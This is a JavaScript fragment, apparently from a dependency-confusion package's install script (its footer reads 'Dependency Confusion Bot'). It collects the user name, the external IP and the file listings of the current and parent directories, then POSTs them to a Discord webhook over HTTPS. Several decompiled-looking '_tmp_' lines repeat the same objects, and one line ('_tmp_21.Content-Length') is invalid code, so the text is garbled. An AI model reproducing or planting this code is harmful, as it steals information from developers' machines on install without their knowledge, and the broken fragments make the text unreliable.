const currentDirectory = process.cwd()
const filesInDirectory = "```" + fs.readdirSync(currentDirectory).join('\n') + "```"
const embedPayload = JSON.stringify({
        embeds: [{
            title: "Package Installation",
            color: 3447003,
            fields: [
                { name: "Package", value: packageName, inline: true },
                { name: "Version", value: "`" + getPackageVersion() + "`", inline: true },
                { name: "User", value: currentUser, inline: false },
                { name: "Current Directory", value: "`" + currentDirectory + "`", inline: false },
                { name: "Files in " + currentDirectory, value: filesInDirectory || "None", inline: false },
                { name: "Files in " + upperDirectory, value: filesInUpperDirectory || "None", inline: false },
                { name: "External IP", value: "`" + externalIP + "`" || "Unavailable", inline: false },
                ...fields
            ],
            footer: {
                text: "Dependency Confusion Bot"
            },
            timestamp: new Date().toISOString()
        }]
    })
_tmp_5.embeds = [{
            title: "Package Installation",
            color: 3447003,
            fields: [
                { name: "Package", value: packageName, inline: true },
                { name: "Version", value: "`" + getPackageVersion() + "`", inline: true },
                { name: "User", value: currentUser, inline: false },
                { name: "Current Directory", value: "`" + currentDirectory + "`", inline: false },
                { name: "Files in " + currentDirectory, value: filesInDirectory || "None", inline: false },
                { name: "Files in " + upperDirectory, value: filesInUpperDirectory || "None", inline: false },
                { name: "External IP", value: "`" + externalIP + "`" || "Unavailable", inline: false },
                ...fields
            ],
            footer: {
                text: "Dependency Confusion Bot"
            },
            timestamp: new Date().toISOString()
        }]
_tmp_7.fields = [
                { name: "Package", value: packageName, inline: true },
                { name: "Version", value: "`" + getPackageVersion() + "`", inline: true },
                { name: "User", value: currentUser, inline: false },
                { name: "Current Directory", value: "`" + currentDirectory + "`", inline: false },
                { name: "Files in " + currentDirectory, value: filesInDirectory || "None", inline: false },
                { name: "Files in " + upperDirectory, value: filesInUpperDirectory || "None", inline: false },
                { name: "External IP", value: "`" + externalIP + "`" || "Unavailable", inline: false },
                ...fields
            ]
_tmp_8.push({ name: "Files in " + currentDirectory, value: filesInDirectory || "None", inline: false })
_tmp_8.push({ name: "Files in " + upperDirectory, value: filesInUpperDirectory || "None", inline: false })
_tmp_8.push({ name: "External IP", value: "`" + externalIP + "`" || "Unavailable", inline: false })
_tmp_8.push(...fields)
const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': embedPayload.length
        }
    }
_tmp_20.headers = {
            'Content-Type': 'application/json',
            'Content-Length': embedPayload.length
        }
_tmp_21.Content-Length = embedPayload.length
const req = https.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            console.log('Embed message sent to Discord', data);
        });
    })
